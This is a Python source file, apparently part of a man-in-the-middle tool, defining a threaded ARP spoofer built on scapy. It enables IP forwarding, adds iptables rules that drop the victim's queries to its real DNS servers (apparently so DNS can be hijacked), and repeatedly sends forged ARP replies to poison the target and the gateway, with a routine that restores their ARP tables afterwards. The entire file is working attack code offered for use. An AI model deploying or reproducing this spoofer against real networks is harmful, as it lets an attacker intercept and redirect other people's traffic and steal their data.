from scapy.all import *
import subprocess
from threading import Thread
from netifaces import interfaces

class Spoofer(Thread):

    target_ip : str
    interface : str
    gateway_ip : str
    target_mac : str
    gateway_mac : str
    dns_1_ip : str
    dns_2_ip : str
    running : bool
    

    def __init__(self,target_ip : str, interface : str) -> None:
        Thread.__init__(self)

        print("Initialization of Spoofer module\n")
        
        assert target_ip is not None, "Targeted IP can't be empty"
        self.target_ip = target_ip.strip()
        print(f"TARGET IP ADDRESS:  {self.target_ip}")
        
        
        assert interface is not None, "Interface can't be empty"
        self.interface = interface.strip()
        assert self.interface in interfaces(), "Unknown interface"
        print(f"INTERFACE: {self.interface}")
        
        try: 
            self.gateway_ip = subprocess.run(['ip', 'route', 'show', 'default'],capture_output=True, text=True, check=True).stdout.strip().split(" ")[2]
        except Exception as e:
            raise Exception(f"Failed to get gateway IP: {e}")
        print(f"GATEWAY IP ADDRESS: {self.gateway_ip}")

        try:
            self.target_mac = Spoofer.get_mac_address(target_ip)
        except IndexError as e:
            raise Exception("Failed to get MAC Address, check the targeted IP")
        except Exception as e:
            raise Exception(f"Unexpected error occurred: {e}")
        print(f"TARGET MAC ADDRESS: {self.target_mac}")

        try:
            self.gateway_mac = Spoofer.get_mac_address(self.gateway_ip)
        except IndexError as e:
            raise Exception("Failed to get MAC Address, check the gateway IP")
        except Exception as e:
            raise Exception(f"Unexpected error occurred: {e}")
        print(f"GATEWAY MAC ADDRESS: {self.gateway_mac}")

        try: 
            self.dns_1_ip = subprocess.run(['cat', '/etc/resolv.conf'],capture_output=True, text=True, check=True).stdout.strip().split("nameserver")[1].strip().split("\n")[0]
        except Exception as e:
            raise Exception(f"Failed to get DNS 1 IP: {e}")
        print(f"DNS 1 IP ADDRESS: {self.dns_1_ip}")

        try: 
            self.dns_2_ip = subprocess.run(['cat', '/etc/resolv.conf'],capture_output=True, text=True, check=True).stdout.strip().split("nameserver")[2].strip().split("\n")[0]
        except Exception as e:
            self.dns_2_ip = None
        print(f"DNS 2 IP ADDRESS: {self.dns_2_ip}")


        Spoofer.enable_packet_forwarding()
        self.allow_forwarding_firewall()
        self.filter_responses_dns_server()

        self.running = False

    @staticmethod
    def enable_packet_forwarding() -> None:
        try:
            subprocess.run(['sudo','sysctl','-w','net.ipv4.ip_forward=1'])
        except Exception as e:
            raise Exception(f"Failed to enable packet forwarding: {e}")

    @staticmethod
    def disable_packet_forwarding() -> None:
        try:
            subprocess.run(['sudo','sysctl','-w','net.ipv4.ip_forward=0'])
        except Exception as e:
            raise Exception(f"Failed to disable packet forwarding: {e}")

    def allow_forwarding_firewall(self) -> None:
        try:
            subprocess.run(['sudo','iptables','-A','FORWARD','-i',self.interface,'-o',self.interface,'-j','ACCEPT'])
        except Exception as e:
            raise Exception(f"Failed to allow forwarding through firewall: {e}")

    def filter_responses_dns_server(self) -> None:
        try:
            subprocess.run(['sudo','iptables','-I','FORWARD','3','-p','udp','--dport','53','-d',self.dns_1_ip,'-s',self.target_ip,'-j','DROP'])
        except Exception as e:
            raise Exception(f"Failed to add a drop filter between dns server 1 and target: {e}")

        if self.dns_2_ip is not None:
            try:
                subprocess.run(['sudo','iptables','-I','FORWARD','3','-p','udp','--dport','53','-d',self.dns_2_ip,'-s',self.target_ip,'-j','DROP'])
            except Exception as e:
                raise Exception(f"Failed to add a drop filter between dns server 2 and target: {e}")

    def remove_filter_dns_server(self) -> None:
        try:
            subprocess.run(['sudo','iptables','-D','FORWARD','3'])
        except Exception as e:
            raise Exception(f"Failed to remove filter between dns server 1 and target: {e}")

        if self.dns_2_ip is not None:
            try:
                subprocess.run(['sudo','iptables','-D','FORWARD','3'])
            except Exception as e:
                raise Exception(f"Failed to remove filter between dns server 2 and target: {e}")

    @staticmethod
    def get_mac_address(ip_address : str) -> str:
        broadcast_arp_request = Ether(dst = "ff:ff:ff:ff:ff:ff") / \
            ARP(pdst = ip_address)

        list_sent_received_packet, _ = srp(broadcast_arp_request, timeout=1, verbose = False)
        first_response  = list_sent_received_packet[0][1]
        mac_address = first_response.hwsrc

        return mac_address

    @staticmethod
    def spoofing(target_ip : str, spoofed_ip : str, target_mac : str) -> None:
        conf.verb = False
        spoofing_packet = ARP(op = "is-at",psrc=spoofed_ip, pdst = target_ip, hwdst = target_mac)
        send(spoofing_packet)

    def run(self) -> None:
        self.running = True
        while self.running:
            Spoofer.spoofing(self.gateway_ip,self.target_ip,self.gateway_mac)
            Spoofer.spoofing(self.target_ip,self.gateway_ip,self.target_mac)
            time.sleep(2)

    def stop(self) -> None:
        self.running = False
        reverting_packet_gateway = ARP(op = "is-at", psrc = self.target_ip, hwsrc = self.target_mac, pdst = self.gateway_ip, hwdst = self.gateway_mac)
        reverting_packet_target = ARP(op = "is-at", psrc = self.gateway_ip, hwsrc = self.gateway_mac, pdst = self.target_ip, hwdst = self.target_mac)
        send(reverting_packet_gateway, count = 1, verbose = False)
        send(reverting_packet_target, count = 1, verbose = False)